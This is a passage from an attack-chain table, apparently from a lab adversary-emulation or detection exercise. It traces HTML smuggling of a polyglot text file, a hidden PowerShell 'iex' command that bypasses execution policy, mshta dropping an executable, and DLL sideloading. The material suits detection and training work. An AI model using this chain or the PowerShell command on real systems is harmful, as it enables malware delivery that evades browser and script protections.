...
**Entry:** victim browser loads http://192.168.56.2:8080/staging.html (served web content, no compiled binary)  ·  **Artifact summary:** browser-smuggled polyglot .txt → powershell-decoded .hta → mshta-dropped EssosUpdate.exe + wsdapi.dll in %TEMP% → hidden loader launch (wsdapi.dll sideload handoff)
...
| 2 | browser fetches staging.html from 192.168.56.2:8080 | HTTP session /staging.html [netconn] → #3 | — | operator hosts only staging.html; .txt and .hta are never served over HTTP |
...
| 5 | page reconstructs Essos_Compliance_Update.txt from embedded base64 and triggers browser save to Downloads | %USERPROFILE%\Downloads\Essos_Compliance_Update.txt [file] → #10 | — | atob → Blob → object URL → synthetic anchor download; no HTTP request for the .txt; browser applies Zone.Identifier (ZoneId=3) |
...
| 9 | Run dialog (explorer.exe) spawns powershell.exe -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\Essos_Compliance_Update.txt')" | powershell.exe process [process] → #10 | — | hidden window (-w h), ExecutionPolicy Bypass |
| 10 | powershell reads polyglot .txt, keeps regex-matching base64 lines, decodes via FromBase64Transform, writes %TEMP%\Essos_Compliance_Update.bin | %TEMP%\Essos_Compliance_Update.bin [file] → #11 | — | PEM certificate-bundle body inside <# #> PowerShell block comment; decode output equals stage1.hta content (410,067 B) |
